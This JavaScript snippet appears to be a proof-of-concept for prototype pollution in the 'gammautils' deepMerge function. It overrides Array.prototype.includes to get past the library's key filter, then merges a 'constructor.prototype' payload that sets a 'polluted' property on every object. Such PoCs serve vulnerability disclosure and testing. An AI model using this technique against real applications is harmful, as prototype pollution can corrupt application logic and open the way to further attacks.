Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const gammautils = require('gammautils');
var payload = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
gammautils.object.deepMerge({}, payload);
console.log({}.polluted);